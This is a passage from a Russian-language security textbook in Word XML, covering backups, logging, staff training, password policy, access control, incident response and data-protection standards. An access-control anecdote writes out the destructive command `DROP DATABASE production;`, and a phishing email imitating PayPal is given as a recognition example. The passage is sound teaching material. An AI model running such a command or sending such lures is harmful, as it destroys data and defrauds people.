      <w:r>
        <w:t>**Понедельник**: Full backup (100 GB)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Вторник**: Incremental (изменилось 5 GB) → сохраняем 5 GB</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Среда**: Incremental (изменилось 3 GB) → сохраняем 3 GB</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Восстановление**: Full backup (пн) + Incremental (вт) + Incremental (ср) = 100 + 5 + 3 = 108 GB</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Антипример</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Code Spaces (хостинг-провайдер). В 2014 году хакеры получили доступ к консоли AWS, удалили все серверы и резервные копии (которые были в той же зоне доступности). Компания закрылась через 12 часов. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Мораль</w:t>
      </w:r>
      <w:r>
        <w:t>: храни backup offsite!</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>6. Мониторинг и логирование</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Что</w:t>
      </w:r>
      <w:r>
        <w:t>: Запись всех событий (кто что делал) и анализ логов.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Что логировать</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Успешные/неудачные попытки входа</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Изменения в конфигурации системы</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Доступ к критичным файлам</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Сетевая активность (кто куда подключается)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Инструменты</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Syslog** (стандарт логирования в Linux/Unix)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**ELK Stack** (Elasticsearch + Logstash + Kibana) — сбор и анализ логов</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Splunk** (коммерческая SIEM-система)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**SIEM (Security Information and Event Management)** — корреляция событий из разных источников</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример</w:t>
      </w:r>
      <w:r>
        <w:t>: Кто-то залогинился с твоего аккаунта в 3 часа ночи с IP из Китая. Система мониторинга увидит это (обычно ты логинишься днём с IP из России) и отправит алерт.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>9.1.7. Организационные меры защиты</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Технологии — это хорошо, но </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>90% инцидентов связаны с человеческим фактором</w:t>
      </w:r>
      <w:r>
        <w:t>. Поэтому нужны организационные меры.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>1. Обучение персонала</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Проблема</w:t>
      </w:r>
      <w:r>
        <w:t>: Сотрудники — самое слабое звено. Они кликают на фишинговые письма, используют пароль `123456`, оставляют ноутбук с паролями на вход в кафе.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Решение</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Регулярные тренинги по ИБ (раз в квартал)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Симуляция фишинга (отправляем тестовые письма, смотрим кто кликнул)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Инструкции: как выбирать пароль, как распознать фишинг, как работать с конфиденциальными данными</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример фишинга</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">&gt; Тема: Ваш аккаунт заблокирован!  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">&gt; От: security@paypal-secure.com (подозрительный домен)  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">&gt; Текст: Ваш аккаунт PayPal был заблокирован из-за подозрительной активности. Нажмите здесь, чтобы восстановить доступ: [ссылка на поддельный сайт]  </w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Если сотрудник кликнет и введёт пароль — всё, аккаунт украден.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Что должен заметить обученный сотрудник</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Домен `paypal-secure.com`, а не `paypal.com`</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Паника в письме ("заблокирован!", "срочно!")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Грамматические ошибки (если письмо от хакеров из Нигерии)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>2. Политика паролей</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Требования</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Минимальная длина: **12 символов** (лучше 16)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Содержит: заглавные, строчные буквы, цифры, спецсимволы (`A-Z a-z 0-9 !@#$%`)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Не содержит: словарные слова, даты рождения, имена</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Срок действия: **90 дней** (спорно: NIST в 2020 сказал, что частая смена паролей не улучшает безопасность, если пароль сильный)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Менеджеры паролей</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>1Password, Bitwarden, KeePass</w:t>
      </w:r>
      <w:r>
        <w:t>. Генерируют и хранят сложные пароли. Ты запоминаешь один мастер-пароль, менеджер помнит остальные.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Антипример</w:t>
      </w:r>
      <w:r>
        <w:t>: В 2012 году LinkedIn утекло 6.5 миллионов паролей. Топ-10 паролей:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>`123456`</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>`password`</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>`linkedin`</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>`123456789`</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>`qwerty`</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Если твой пароль в этом списке — пиздец тебе.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>3. Разграничение доступа</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Принцип</w:t>
      </w:r>
      <w:r>
        <w:t>: Need-to-know (необходимость знать). Каждый сотрудник имеет доступ только к тем данным, которые ему нужны для работы.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**HR-менеджер**: доступ к базе сотрудников, зарплатам</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Разработчик**: доступ к репозиторию кода, тестовой БД</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Системный администратор**: доступ к серверам, конфигурации</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Бухгалтер**: доступ к финансовой системе</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Проблема</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: "А давай я дам админские права всем, чтобы не беспокоили".  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Итог</w:t>
      </w:r>
      <w:r>
        <w:t>: Джуниор-разработчик случайно выполнил `DROP DATABASE production;` → потеряли базу клиентов.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>4. Реагирование на инциденты</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Incident Response Plan (IRP)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — план действий при инциденте (взлом, утечка, вирус).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Фазы</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>1. Подготовка (Preparation)</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Создание CERT/CSIRT (Computer Security Incident Response Team)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Подготовка инструментов (Wireshark, Volatility, forensics tools)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Тренировки (tabletop exercises)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>2. Обнаружение (Detection/Identification)</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Мониторинг логов (IDS, SIEM)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Получение алерта (например, антивирус нашёл троян)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Анализ: действительно ли это инцидент или ложное срабатывание?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>3. Сдерживание (Containment)</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Изоляция заражённого устройства (отключить от сети)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Заблокировать скомпрометированный аккаунт</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Остановить распространение вируса</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>4. Удаление угрозы (Eradication)</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Удаление вируса</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Закрытие уязвимости (установка патча)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Смена паролей</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>5. Восстановление (Recovery)</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Восстановление из backup</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Возврат систем в рабочее состояние</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Мониторинг: не вернулась ли угроза?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>6. Анализ (Lessons Learned)</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Что произошло?</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Почему система была уязвима?</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Как предотвратить в будущем?</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Обновление политики безопасности</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример</w:t>
      </w:r>
      <w:r>
        <w:t>: В 2017 году WannaCry (ransomware-вирус) зашифровал компьютеры в 150 странах. Больше всего пострадала NHS (Национальная служба здравоохранения Великобритании). Инцидент-респонс:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Обнаружение**: компьютеры начали выдавать окно с требованием выкупа в биткоинах</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Сдерживание**: отключили заражённые компьютеры от сети</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Удаление**: использовали "kill switch" (исследователь нашёл домен, который останавливал вирус)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Восстановление**: переустановили Windows, восстановили данные из backup</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Анализ**: выяснилось, что NHS не обновила Windows (уязвимость EternalBlue, патч вышел за 2 месяца до атаки)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>9.1.8. Стандарты и нормативные документы</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Чтобы не изобретать велосипед, используют готовые стандарты.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>1. ISO/IEC 27001 — Международный стандарт ИБ</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Что</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Стандарт </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>системы управления информационной безопасностью (СУИБ / ISMS)</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Основные пункты</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Оценка рисков (Risk Assessment)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Политика безопасности</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Контроль доступа</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Криптография</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Физическая безопасность (охрана дата-центров)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Непрерывность бизнеса (Business Continuity)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Сертификация</w:t>
      </w:r>
      <w:r>
        <w:t>: Компания может пройти аудит и получить сертификат ISO 27001. Это повышает доверие клиентов.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример</w:t>
      </w:r>
      <w:r>
        <w:t>: Если ты хостинг-провайдер, и у тебя нет ISO 27001, крупные клиенты (банки, госкомпании) не будут с тобой работать.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>2. ГОСТ Р ИСО/МЭК 27001 (Россия)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Что</w:t>
      </w:r>
      <w:r>
        <w:t>: Российский аналог ISO 27001. Почти идентичен, но адаптирован под российское законодательство.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Плюс</w:t>
      </w:r>
      <w:r>
        <w:t>: Обязателен для госорганизаций и критической инфраструктуры (энергетика, транспорт, связь).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>3. GDPR (General Data Protection Regulation) — Европа</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Что</w:t>
      </w:r>
      <w:r>
        <w:t>: Закон о защите персональных данных в Европейском Союзе (вступил в силу в 2018).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Основные требования</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Согласие**: нельзя собирать данные без явного согласия пользователя</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Право на забвение**: пользователь может потребовать удалить все его данные</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Прозрачность**: пользователь должен знать, какие данные о нём собираются и для чего</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Уведомление о утечке**: если утекли данные, уведомить пользователей в течение **72 часов**</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Штрафы</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: до </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>€20 миллионов</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> или </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>4% годового оборота</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (что больше).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример</w:t>
      </w:r>
      <w:r>
        <w:t>: Facebook в 2019 году получил штраф $5 миллиардов от FTC (США) за нарушение приватности (скандал с Cambridge Analytica). В ЕС аналогичные штрафы по GDPR.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>4. 152-ФЗ "О персональных данных" (Россия)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Что</w:t>
      </w:r>
      <w:r>
        <w:t>: Российский закон о защите персональных данных (аналог GDPR).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Что такое персональные данные</w:t>
      </w:r>
      <w:r>
        <w:t>: ФИО, дата рождения, адрес, номер телефона, email, паспортные данные, биометрия.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Требования</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Получить согласие на обработку персональных данных</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Обеспечить защиту данных (шифрование, контроль доступа)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Уведомить Роскомнадзор при утечке</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Штрафы</w:t>
      </w:r>
      <w:r>
        <w:t>: до 75,000 рублей для физлиц, до 500,000 для юрлиц.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример</w:t>
      </w:r>
      <w:r>
        <w:t>: Если ты собираешь email на сайте (например, для рассылки), ты обязан:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Показать пользователю политику конфиденциальности</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Получить галочку "Я согласен на обработку персональных данных"</w:t>
      </w:r>
